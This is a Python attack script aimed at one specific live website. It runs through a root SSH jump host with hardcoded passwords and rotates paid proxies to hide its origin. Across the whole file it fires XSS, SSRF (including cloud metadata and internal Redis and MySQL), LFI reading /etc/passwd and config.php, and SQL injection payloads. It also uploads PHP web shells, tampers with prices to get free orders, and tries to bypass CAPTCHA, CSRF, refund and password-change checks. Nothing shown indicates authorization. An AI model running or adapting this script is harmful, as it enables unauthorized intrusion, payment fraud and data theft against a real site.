#!/usr/bin/env python3
"""qq1.lol comprehensive vuln-class probe — XSS, SSRF, LFI, CORS, Host, logic, upload, IDOR, info leak"""
import hashlib
import json
import os
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "vulnclass.log"
HITS = OUT / "vulnclass_hits.jsonl"
REPORT = OUT / "vulnclass_report.json"

QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
JP_PASS = os.environ.get("JP_PASS", "DX4LmrDaPfd9")
JP_HOST = os.environ.get("JP_HOST", "42.240.167.114")
JAR = "/tmp/qq1_vulnclass.jar"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

report = {"ts": datetime.now().isoformat(), "hits": [], "notes": []}
_px = None


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body="", severity="MEDIUM"):
    rec = {
        "ts": datetime.now().isoformat(), "severity": severity,
        "kind": kind, "detail": detail, "body": (body or "")[:8000],
    }
    report["hits"].append(rec)
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{severity}/{kind}] {detail}: {(body or '')[:280]}")


def note(msg):
    report["notes"].append(msg)
    log(f"NOTE {msg}")


def ssh(script, timeout=55):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout,
    ).stdout or ""


def proxy(force=False):
    global _px
    if _px and not force:
        return _px
    d = json.loads(ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 20))
    _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    log(f"proxy {_px.split('@')[1]}")
    return _px


def curl(url, post=None, extra="", mt=25, force_px=False, follow=False):
    px = proxy(force_px)
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest'"
    if extra:
        hdr += " " + extra
    fl = "-L" if follow else ""
    pp = (
        f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}"
        if post is not None else ""
    )
    script = (
        f"curl -sk {fl} --max-time {mt} -x {shlex.quote(px)} -b {JAR} -c {JAR} -A {shlex.quote(UA)} "
        f"{hdr} {pp} -w '\\n__HTTP:%{{http_code}}__REDIR:%{{redirect_url}}' {shlex.quote(url)}"
    )
    out = ssh(script, mt + 30)
    if "__HTTP:" not in out:
        return out.strip(), "000", ""
    body, tail = out.rsplit("__HTTP:", 1)
    m = re.match(r"(\d+)__REDIR:(.*)", tail.strip())
    code = m.group(1) if m else "000"
    redir = m.group(2) if m else ""
    return body.strip(), code, redir


def session():
    ssh(f"rm -f {JAR}")
    proxy(True)
    curl(f"{BASE}/")
    buy, code, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
    if len(buy) < 500:
        buy, code, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102", force_px=True)
    csrf = ""
    hs = ""
    m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    if m:
        csrf = m.group(1)
    hm = re.search(r"var hashsalt=(.+);", buy)
    if hm:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hm.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=8,
        ).stdout.strip()
    return csrf, hs, buy


# --------------- vuln classes ---------------

def test_info_leak():
    log("=== [1] Info disclosure / sensitive paths ===")
    paths = [
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/security.txt", "/.well-known/security.txt",
        "/composer.json", "/composer.lock", "/package.json", "/README.md", "/readme.txt",
        "/.git/HEAD", "/.git/config", "/.svn/entries", "/.env", "/.env.local", "/.env.bak",
        "/config.php.bak", "/config.php~", "/config.php.old", "/config.php.save",
        "/includes/common.php.bak", "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/admin/", "/admin/login.php", "/admin/index.php",
        "/install/", "/install/install.lock", "/install/index.php",
        "/runtime/", "/runtime/log/", "/runtime/cache/", "/data/", "/backup/",
        "/uploads/", "/upload/", "/static/", "/template/",
        "/%61pi.php?act=siteinfo", "/%61pi.php?act=classlist",
        "/ajax.php?act=getcount", "/ajax.php?act=getclass", "/ajax.php?act=gettoolnew",
        "/toollogs.php", "/cron.php",
        "/assets/faka/js/faka.js.map", "/assets/faka/js/query.js.map",
        "/web.config", "/.user.ini", "/.htaccess",
    ]
    for p in paths:
        body, code, _ = curl(BASE + p, mt=15)
        if code == "200" and body and len(body) > 5:
            if any(x in body[:80] for x in ("404", "403", "Not Found", "Forbidden", "_guard")):
                continue
            interesting = any(x in body for x in (
                "<?php", "define(", "DB_", "password", "mysql", "redis", "apikey", "SYS_KEY",
                "ref:", "[core]", "sitename", "kminfo", "root:", "AWS", "SECRET",
            ))
            if interesting or (p.endswith((".txt", ".xml", ".json", ".md", ".lock", ".map", ".bak", "~")) and len(body) > 20):
                hit("info_leak", f"{p} HTTP={code} len={len(body)}", body[:2000], "HIGH" if interesting else "LOW")
            elif len(body) > 100 and p in ("/install/", "/toollogs.php", "/admin/"):
                note(f"path exists {p} len={len(body)}")
        time.sleep(0.25)


def test_xss():
    log("=== [2] Reflected XSS ===")
    payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '{{7*7}}',
        '${7*7}',
        '<svg/onload=alert(1)>',
    ]
    params = [
        ("/?mod=so&kw=", "kw"),
        ("/?mod=query&data=", "data"),
        ("/?mod=buy&cid=4&tid=102&x=", "x"),
        ("/ajax.php?act=getshareid&url=", "url"),
    ]
    for base, name in params:
        for px in payloads:
            url = base + quote(px)
            body, code, _ = curl(url)
            if body and px in body and "text/html" not in str(code):
                # reflected raw
                if "<script>alert" in body or "onerror=alert" in body or "{{7*7}}" in body:
                    # check not escaped
                    if "&lt;script" not in body and "\\u003c" not in body:
                        hit("xss_reflected", f"{name}={px[:30]}", body[:1500], "HIGH")
            time.sleep(0.3)


def test_ssrf(hs):
    log("=== [3] SSRF getshareid ===")
    # must POST url+hashsalt with valid session salt
    targets = [
        "https://httpbin.org/get?ssrf=1",
        "http://127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:3306/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
        f"{BASE}/ajax.php?act=getcount",
        f"{BASE}/config.php",
        f"{BASE}/install/install.lock",
    ]
    for u in targets:
        body, code, _ = curl(f"{BASE}/ajax.php?act=getshareid", post=f"url={quote(u)}&hashsalt={hs}")
        log(f"  ssrf {u[:50]} HTTP={code} body={str(body)[:100]!r}")
        if body and '"code":0' in body:
            hit("ssrf", u, body, "CRITICAL")
        elif body and any(x in body for x in ("root:", "ami-", "redis", "mysql", "songid", "passwd")):
            hit("ssrf_partial", u, body, "HIGH")
        time.sleep(0.6)


def test_lfi():
    log("=== [4] LFI / path traversal ===")
    payloads = [
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/read=convert.base64-encode/resource=includes/common.php",
        "file:///etc/passwd",
    ]
    params = ["file", "page", "mod", "template", "include", "path", "f", "url", "doc", "lang"]
    for param in params:
        for p in payloads[:4]:
            body, code, _ = curl(f"{BASE}/?{param}={quote(p)}")
            if body and ("root:" in body or "PD9waHA" in body or "define(" in body[:200]):
                hit("lfi", f"{param}={p}", body[:2000], "CRITICAL")
            time.sleep(0.2)


def test_cors_headers():
    log("=== [5] CORS / security headers ===")
    origins = ["https://evil.com", "null", "https://qq1.lol.evil.com", "https://qq1.lol"]
    for origin in origins:
        body, code, _ = curl(
            f"{BASE}/ajax.php?act=getcount",
            extra=f"-H 'Origin: {origin}' -D -",
        )
        # headers are in body when -D -
        acao = re.search(r"(?i)access-control-allow-origin:\s*(\S+)", body or "")
        acac = re.search(r"(?i)access-control-allow-credentials:\s*(\S+)", body or "")
        if acao:
            log(f"  Origin={origin} ACAO={acao.group(1)} ACAC={acac.group(1) if acac else None}")
            if acao.group(1) in ("*", origin) and origin != "https://qq1.lol":
                hit("cors", f"Origin={origin} ACAO={acao.group(1)}", body[:800], "HIGH")
        time.sleep(0.3)

    # security headers check
    body, _, _ = curl(f"{BASE}/", extra="-D -")
    missing = []
    for h in ("strict-transport-security", "x-frame-options", "content-security-policy", "x-content-type-options"):
        if not re.search(rf"(?i){h}:", body or ""):
            missing.append(h)
    if missing:
        note(f"missing security headers: {missing}")


def test_host_header():
    log("=== [6] Host header injection ===")
    for host in ("evil.com", "qq1.lol.evil.com", "127.0.0.1", "localhost"):
        body, code, redir = curl(
            f"{BASE}/",
            extra=f"-H 'Host: {host}' -H 'X-Forwarded-Host: {host}'",
        )
        if redir and host in redir:
            hit("host_redir", f"Host={host} -> {redir}", redir, "MEDIUM")
        if body and f"https://{host}" in body:
            hit("host_reflect", f"Host={host}", body[:800], "MEDIUM")
        time.sleep(0.3)


def test_open_redirect():
    log("=== [7] Open redirect ===")
    targets = [
        "/user/login.php?back=https://evil.com",
        "/user/login.php?goto=https://evil.com",
        "/user/login.php?redirect=https://evil.com",
        "/user/login.php?url=https://evil.com",
        "/user/login.php?next=//evil.com",
        "/user/connect.php?type=qq&redirect_uri=https://evil.com",
        "/?mod=query&data=https://evil.com",
        "/other/submit.php?type=alipay&orderid=1&return=https://evil.com",
    ]
    for t in targets:
        body, code, redir = curl(BASE + t)
        if redir and "evil.com" in redir:
            hit("open_redirect", t, redir, "MEDIUM")
        if body and ('location.href="https://evil.com"' in body or "location.href='https://evil.com'" in body):
            hit("open_redirect_js", t, body[:500], "MEDIUM")
        time.sleep(0.3)


def test_business_logic(csrf, hs):
    log("=== [8] Business logic (price/qty/race) ===")
    # price/qty tamper
    cases = [
        f"tid=102&num=0&inputvalue=logic0&csrf_token={csrf}&hashsalt={hs}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
        f"tid=102&num=-1&inputvalue=logicneg&csrf_token={csrf}&hashsalt={hs}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
        f"tid=102&num=99999&inputvalue=logicmax&csrf_token={csrf}&hashsalt={hs}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
        f"tid=102&num=1&money=0.01&inputvalue=logicprice&csrf_token={csrf}&hashsalt={hs}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
        f"tid=102&num=1&price=0&inputvalue=logicp0&csrf_token={csrf}&hashsalt={hs}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
        f"tid=102&num=1&inputvalue=logic&csrf_token={csrf}&hashsalt={hs}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan&zid=1",
        f"tid=118&num=1&inputvalue=123456&csrf_token={csrf}&hashsalt={hs}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
    ]
    for post in cases:
        # refresh hashsalt each time ideally - reuse may fail
        body, code, _ = curl(f"{BASE}/ajax.php?act=pay", post=post)
        log(f"  pay {post[4:40]}... -> {str(body)[:100]}")
        if body and '"code":0' in body:
            # check if need money is weird
            if '"need":0' in body or '"need":"0"' in body or '"money":0' in body:
                hit("free_order", post[:60], body, "CRITICAL")
            else:
                note(f"order created: {body[:120]}")
        time.sleep(0.8)

    # coupon / gift
    for act, post in [
        ("gift_start", f"csrf_token={csrf}"),
        ("coupon", f"code=TEST&csrf_token={csrf}"),
        ("coupon", f"code=buyi&csrf_token={csrf}"),
    ]:
        body, _, _ = curl(f"{BASE}/ajax.php?act={act}", post=post)
        if body and '"code":0' in body:
            hit("coupon_gift", act, body, "MEDIUM")
        log(f"  {act}: {str(body)[:80]}")


def test_upload(csrf):
    log("=== [9] File upload ===")
    # create temp files on jump via heredoc is hard; use echo+curl -F with remote file creation
    for fname, content, ctype in [
        ("shell.php", "<?php echo 'pwn';?>", "image/jpeg"),
        ("shell.php.jpg", "<?php echo 'pwn';?>", "image/jpeg"),
        ("shell.phtml", "<?php echo 'pwn';?>", "application/octet-stream"),
        ("test.jpg", "\xff\xd8\xff\xe0fake", "image/jpeg"),
    ]:
        # write file on jump then upload
        script = (
            f"printf %s {shlex.quote(content)} > /tmp/{fname}; "
            f"curl -sk --max-time 20 -x {shlex.quote(proxy())} -b {JAR} -c {JAR} -A {shlex.quote(UA)} "
            f"-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest' "
            f"-F 'file=@/tmp/{fname};type={ctype}' -F 'csrf_token={csrf}' "
            f"-w '\\n__HTTP:%{{http_code}}' {shlex.quote(BASE + '/ajax.php?act=upload')}"
        )
        out = ssh(script, 45)
        body = out.split("__HTTP:")[0].strip() if "__HTTP:" in out else out
        code = out.split("__HTTP:")[-1].strip() if "__HTTP:" in out else "?"
        log(f"  upload {fname} HTTP={code} body={str(body)[:100]}")
        if body and ('"code":0' in body or "url" in body.lower() or "upload" in body.lower()) and "失败" not in body:
            hit("upload", fname, body, "CRITICAL")
        time.sleep(0.5)


def test_idor(csrf, hs):
    log("=== [10] IDOR / auth bypass ===")
    # workorder with guessed orderid+skey
    for oid in (1, 100, 25900, 25949):
        for sk in ("", "0", "test", hashlib.md5(f"{oid}".encode()).hexdigest()):
            body, code, _ = curl(f"{BASE}/user/workorder.php?my=add&orderid={oid}&skey={sk}")
            if body and "投诉" in body and "登录" not in body[:200] and len(body) > 1500:
                hit("idor_workorder", f"oid={oid} skey={sk}", body[:1000], "HIGH")
            time.sleep(0.3)

    # changepwd / apply_refund without valid skey
    for act in ("changepwd", "apply_refund", "fill"):
        body, _, _ = curl(
            f"{BASE}/ajax.php?act={act}",
            post=f"id=25949&orderid=25949&pwd=test123&skey=0&csrf_token={csrf}",
        )
        if body and '"code":0' in body:
            hit("idor_ajax", act, body, "CRITICAL")
        log(f"  {act}: {str(body)[:80]}")

    # payrmb without login
    body, _, _ = curl(f"{BASE}/ajax.php?act=payrmb", post=f"orderid=20260721023357111&csrf_token={csrf}")
    log(f"  payrmb: {str(body)[:100]}")
    if body and '"code":1' in body:
        hit("payrmb_bypass", "unauth", body, "CRITICAL")


def test_sqli_encoded(hs):
    log("=== [11] Encoded SQLi on query/data ===")
    payloads = [
        "1' OR '1'='1",
        "1' AND SLEEP(3)-- -",
        "1 UNION SELECT 1,2,3-- -",
        "1') OR ('1'='1",
    ]
    for p in payloads:
        t0 = time.time()
        body, code, _ = curl(f"{BASE}/?mod=query&data={quote(p)}")
        elapsed = time.time() - t0
        if elapsed >= 3.5 and code not in ("000",):
            hit("sqli_time", f"data={p} t={elapsed:.1f}", body[:300], "HIGH")
        if body and any(x in body.lower() for x in ("sql", "syntax", "mysql", "pdo")):
            hit("sqli_error", p, body[:800], "HIGH")
        # also ajax
        t0 = time.time()
        body2, code2, _ = curl(f"{BASE}/ajax.php?act=query", post=f"qq={quote(p)}&page=1")
        elapsed2 = time.time() - t0
        if elapsed2 >= 3.5 and code2 not in ("000",):
            hit("sqli_time_ajax", f"qq={p} t={elapsed2:.1f}", body2[:300], "HIGH")
        time.sleep(0.5)


def test_session_fix(csrf, hs):
    log("=== [12] Session / csrf / cookie flags ===")
    # cookie flags
    cookies = ssh(f"cat {JAR}")
    log(f"  jar: {cookies[:300]}")
    body, _, _ = curl(f"{BASE}/", extra="-D -")
    set_cookie = re.findall(r"(?i)set-cookie: ([^\r\n]+)", body or "")
    for sc in set_cookie:
        log(f"  Set-Cookie: {sc}")
        if "httponly" not in sc.lower() or "secure" not in sc.lower():
            note(f"weak cookie flags: {sc[:80]}")

    # csrf bypass: empty / wrong
    body, _, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        post=f"tid=102&num=1&inputvalue=csrf1&csrf_token=&hashsalt={hs}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
    )
    log(f"  empty csrf: {str(body)[:100]}")
    if body and '"code":0' in body:
        hit("csrf_bypass", "empty token", body, "HIGH")


def test_http_methods():
    log("=== [13] HTTP methods / TRACE / PUT ===")
    for method in ("OPTIONS", "TRACE", "PUT", "DELETE", "PATCH"):
        script = (
            f"curl -sk --max-time 12 -x {shlex.quote(proxy())} -X {method} "
            f"-H 'Referer: https://qq1.lol/' -w '\\n__HTTP:%{{http_code}}' {shlex.quote(BASE + '/')}"
        )
        out = ssh(script, 25)
        code = out.split("__HTTP:")[-1].strip() if "__HTTP:" in out else "?"
        body = out.split("__HTTP:")[0]
        log(f"  {method}: HTTP={code} len={len(body)}")
        if method == "TRACE" and code == "200" and "TRACE" in body:
            hit("trace_enabled", "TRACE", body[:500], "MEDIUM")
        if method == "PUT" and code in ("200", "201", "204"):
            hit("put_enabled", "PUT", body[:500], "HIGH")


def main():
    log("=== VULNCLASS START ===")
    csrf, hs, buy = session()
    log(f"csrf={csrf[:12] if csrf else None} hs={hs[:12] if hs else None} buy={len(buy)}")

    test_info_leak()
    test_xss()
    if hs:
        test_ssrf(hs)
    test_lfi()
    test_cors_headers()
    test_host_header()
    test_open_redirect()
    if csrf and hs:
        # refresh session tokens for logic tests
        csrf2, hs2, _ = session()
        test_business_logic(csrf2 or csrf, hs2 or hs)
        test_upload(csrf2 or csrf)
        test_idor(csrf2 or csrf, hs2 or hs)
        test_session_fix(csrf2 or csrf, hs2 or hs)
    test_sqli_encoded(hs)
    test_http_methods()

    report["hit_count"] = len(report["hits"])
    with open(REPORT, "w") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    log(f"=== VULNCLASS DONE hits={report['hit_count']} ===")
    for h in report["hits"]:
        log(f"  -> [{h['severity']}] {h['kind']}: {h['detail']}")


if __name__ == "__main__":
    main()
